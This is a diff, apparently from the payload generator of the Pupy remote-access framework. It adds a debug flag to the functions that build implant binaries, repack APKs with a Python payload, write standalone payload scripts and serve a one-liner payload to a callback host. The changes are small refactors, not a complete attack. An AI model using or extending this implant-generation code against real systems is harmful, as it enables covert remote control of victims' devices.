@@ -41,7 +41,7 @@ import json
 
 HARDCODED_CONF_SIZE=65536
 
-def get_edit_binary(path, conf, compressed_config=True):
+def get_edit_binary(path, conf, compressed_config=True, debug=False):
     logging.debug("generating binary %s with conf: %s"%(path, conf))
     binary=b""
     with open(path, 'rb') as f:
@@ -194,11 +194,11 @@ def updateTar(arcpath, arcname, file_path):
     finally:
         shutil.rmtree(tempdir)
 
-def get_edit_apk(path, conf, compressed_config=None):
+def get_edit_apk(path, conf, compressed_config=None, debug=False):
     tempdir = tempfile.mkdtemp(prefix="tmp_pupy_")
     fd, tempapk = tempfile.mkstemp(prefix="tmp_pupy_")
     try:
-        packed_payload=pack_py_payload(get_raw_conf(conf))
+        packed_payload=pack_py_payload(get_raw_conf(conf), debug)
         shutil.copy(path, tempapk)
 
         #extracting the python-for-android install tar from the apk
@@ -395,7 +395,7 @@ def generate_binary_from_template(config, osname, arch=None, shared=False, debug
 
         print colorize("[C] {}: {}".format(k, v), "yellow")
 
-    return generator(template, config, compressed), filename, makex
+    return generator(template, config, compressed, debug), filename, makex
 
 def load_scriptlets():
     scl={}
@@ -621,7 +621,7 @@ def pupygen(args, config):
         outpath = outfile.name
 
     elif args.format=="py" or args.format=="pyinst":
-        linux_modules = ""
+        linux_modules = ''
         if not outpath:
             outfile = tempfile.NamedTemporaryFile(
                 dir=args.output_dir or '.',
@@ -639,15 +639,20 @@ def pupygen(args, config):
 
         if args.format=="pyinst" :
             linux_modules = getLinuxImportedModules()
-        packed_payload=pack_py_payload(get_raw_conf(conf, verbose=True))
+        packed_payload = pack_py_payload(get_raw_conf(conf, verbose=True), args.debug)
 
-        outfile.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+linux_modules+"\n"+packed_payload)
+        outfile.write('\n'.join([
+            '#!/usr/bin/env python',
+            '# -*- coding: utf-8 -*-',
+            linux_modules,
+            packed_payload
+        ]))
         outfile.close()
 
         outpath = outfile.name
 
     elif args.format=="py_oneliner":
-        packed_payload=pack_py_payload(get_raw_conf(conf, verbose=True))
+        packed_payload = pack_py_payload(get_raw_conf(conf, verbose=True), args.debug)
         i=conf["launcher_args"].index("--host")+1
         link_ip=conf["launcher_args"][i].split(":",1)[0]
         serve_payload(packed_payload, link_ip=link_ip, port=args.oneliner_listen_port)
